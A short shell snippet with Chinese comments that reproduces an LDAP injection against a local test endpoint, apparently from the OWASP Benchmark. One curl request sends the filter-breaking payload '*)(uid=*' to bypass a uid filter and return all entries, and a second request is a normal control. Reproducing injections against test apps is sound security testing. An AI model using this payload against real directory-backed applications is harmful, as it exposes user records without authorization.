# 复现 LDAP 注入 - 获取所有条目（绕过 uid 过滤条件）
curl -s 'http://localhost:8443/benchmark/ldapi-00/BenchmarkTest00265' \
  -X POST \
  -d 'BenchmarkTest00265=*)(uid=*'

# 正常请求（对照）
curl -s 'http://localhost:8443/benchmark/ldapi-00/BenchmarkTest00265' \
  -X POST \
  -d 'BenchmarkTest00265=foo'